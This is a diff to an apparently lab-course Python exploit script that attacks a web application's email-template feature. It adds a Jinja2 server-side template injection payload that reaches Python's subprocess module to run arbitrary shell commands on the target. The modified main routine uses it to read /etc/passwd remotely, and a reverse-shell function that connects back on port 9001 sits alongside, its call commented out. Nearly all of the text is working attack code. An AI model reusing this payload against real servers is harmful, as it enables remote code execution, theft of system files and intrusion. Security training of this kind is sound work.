@@ -247,7 +247,7 @@ def generate_shellcode(LHOST, LPORT):
 
 	return encoded
 
-def execute_command(ip, session, admin_email, template_name, command):
+def get_shell(ip, session, admin_email, template_name):
 
 	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
 	LPORT = 9001
@@ -285,6 +285,29 @@ def execute_command(ip, session, admin_email, template_name, command):
 	output = get_output(ip, session, admin_email, template_name, template)
 	print(output)
 
+# Extra Mile 8.6.2.2
+def execute_command(ip, session, admin_email, template_name, command):
+	template = (
+	"{% set init_template = \"__init__\" %}"
+	"{% set global_template = \"__globals__\" %}"
+	"{% set attr = self|attr(init_template)|attr(global_template) %}"
+	"{% set sys = attr.sys %}"
+	"{% set modules = sys|attr(\"modules\") %}"
+	"{% set subprocess = modules.subprocess %}"
+	f"{{{{subprocess.run(\"{command}\", shell=True, stdout=subprocess.PIPE).stdout}}}}"
+	)
+	print()
+	print(f"Executing command: {command}")
+
+	output = get_output(ip, session, admin_email, template_name, template)
+	try:
+		return json.loads(output)["message"]["message"][5:-6]
+	except Exception as e:
+		print(e)
+		print("RCE has failed")
+		exit(0)
+
+
 def main():
 	if len(sys.argv) != 2:
 		print ("(+) usage: %s <target>" % sys.argv[0])
@@ -316,7 +339,15 @@ def main():
 	template_name = create_email_template(ip, session, admin_email, "baseline")
 	print(f"Created new template named: {template_name}")
 
-	execute_command(ip, session, admin_email, template_name, "whoami")
+	# Gets a reverse shell on port 9001
+	#get_shell(ip, session, admin_email, template_name)
+	
+	# Runs arbitrary command
+	cmd = "cat /etc/passwd"
+	output = execute_command(ip, session, admin_email, template_name, cmd)
+	print(output)
+
+
 
 if __name__ == '__main__':
 	main()
